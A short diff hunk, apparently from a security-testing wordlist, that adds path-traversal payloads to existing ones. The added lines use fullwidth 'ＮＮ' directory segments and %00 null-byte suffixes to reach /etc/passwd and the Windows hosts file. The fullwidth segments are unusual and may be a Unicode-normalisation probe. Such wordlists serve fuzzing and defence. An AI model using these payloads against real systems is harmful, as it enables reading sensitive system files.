@@ -1037,3 +1037,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 .\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\Windows/System32/drivers/etc/hosts
 .//..//Windows/System32/drivers/etc/hosts
 .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\Windows/System32/drivers/etc/hosts
+ＮＮ/ＮＮ/ＮＮ/ＮＮ/ＮＮ/ＮＮ/ＮＮ/etc/passwd
+ＮＮ/ＮＮ/ＮＮ/ＮＮ/ＮＮ/ＮＮ/ＮＮ/etc/passwd%00
+ＮＮ\ＮＮ\ＮＮ\ＮＮ\ＮＮ\ＮＮ\ＮＮ\Windows\System32\drivers\etc\hosts
+ＮＮ\ＮＮ\ＮＮ\ＮＮ\ＮＮ\ＮＮ\ＮＮ\Windows\System32\drivers\etc\hosts%00
